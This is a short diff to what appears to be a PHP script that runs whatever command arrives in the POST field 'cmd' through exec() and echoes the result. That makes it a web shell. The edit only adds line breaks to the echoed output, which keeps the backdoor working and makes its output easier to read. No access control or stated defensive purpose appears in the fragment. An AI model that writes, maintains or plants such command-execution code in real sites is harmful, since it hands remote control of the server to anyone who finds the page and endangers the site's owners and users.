@@ -11,7 +11,7 @@ if (isset($_POST['cmd'])) {
     exec($_POST['cmd'], $output);
     echo '<pre>';
     foreach ($output as $line) {
-        echo $line;
+        echo $line.PHP_EOL;
     }
     echo '</pre>';
 }
